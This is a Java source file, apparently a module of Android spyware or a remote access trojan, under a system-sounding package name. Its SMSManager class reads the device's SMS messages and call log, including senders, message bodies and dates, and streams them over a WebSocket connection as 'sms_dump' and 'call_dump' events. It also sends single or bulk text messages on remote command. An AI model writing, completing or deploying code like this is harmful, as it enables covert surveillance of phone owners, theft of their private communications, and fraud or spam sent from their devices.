package com.xrc.system.features;

import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.telephony.SmsManager;
import android.util.Log;

import com.xrc.system.core.Constants;
import com.xrc.system.network.WebSocketClient;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.util.List;

public class SMSManager {
    private static final String TAG = Constants.TAG + ":SMS";
    private static SMSManager instance;
    private final Context ctx;

    private SMSManager(Context ctx) {
        this.ctx = ctx.getApplicationContext();
    }

    public static synchronized SMSManager get(Context ctx) {
        if (instance == null) {
            instance = new SMSManager(ctx);
        }
        return instance;
    }

    public void dumpAndSend(int limit) {
        try {
            Cursor cursor = ctx.getContentResolver().query(
                    Uri.parse("content://sms/"),
                    new String[]{"_id", "address", "body", "date", "type", "read"},
                    null, null, "date DESC LIMIT " + limit);
            if (cursor == null) return;
            JSONArray arr = new JSONArray();
            while (cursor.moveToNext()) {
                JSONObject sms = new JSONObject();
                sms.put("id", cursor.getString(0));
                sms.put("from", cursor.getString(1));
                sms.put("body", cursor.getString(2));
                sms.put("date", cursor.getLong(3));
                sms.put("type", cursor.getInt(4));
                sms.put("read", cursor.getInt(5));
                arr.put(sms);
            }
            cursor.close();
            JSONObject data = new JSONObject();
            data.put("sms", arr);
            data.put("count", arr.length());
            WebSocketClient.get(ctx).sendEvent("sms_dump", data);
        } catch (SecurityException | JSONException e) {
            Log.e(TAG, "SMS dump failed", e);
        }
    }

    public void dumpCallsAndSend(int limit) {
        try {
            Cursor cursor = ctx.getContentResolver().query(
                    android.provider.CallLog.Calls.CONTENT_URI,
                    new String[]{android.provider.CallLog.Calls.NUMBER,
                            android.provider.CallLog.Calls.TYPE,
                            android.provider.CallLog.Calls.DURATION,
                            android.provider.CallLog.Calls.DATE},
                    null, null, android.provider.CallLog.Calls.DATE + " DESC LIMIT " + limit);
            if (cursor == null) return;
            JSONArray arr = new JSONArray();
            while (cursor.moveToNext()) {
                JSONObject call = new JSONObject();
                call.put("number", cursor.getString(0));
                call.put("type", cursor.getInt(1));
                call.put("duration", cursor.getLong(2));
                call.put("date", cursor.getLong(3));
                arr.put(call);
            }
            cursor.close();
            JSONObject data = new JSONObject();
            data.put("calls", arr);
            data.put("count", arr.length());
            WebSocketClient.get(ctx).sendEvent("call_dump", data);
        } catch (SecurityException | JSONException e) {
            Log.e(TAG, "Call dump failed", e);
        }
    }

    public void sendSMS(String to, String body) {
        try {
            SmsManager sm = SmsManager.getDefault();
            sm.sendTextMessage(to, null, body, null, null);
            JSONObject data = new JSONObject();
            data.put("to", to);
            data.put("status", "sent");
            WebSocketClient.get(ctx).sendEvent("sms_sent", data);
        } catch (Exception e) {
            Log.e(TAG, "SMS send failed", e);
        }
    }

    public void sendBulkSMS(List<String> numbers, String body) {
        for (String num : numbers) {
            sendSMS(num, body);
            try {
                Thread.sleep(500);
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
                break;
            }
        }
    }
}
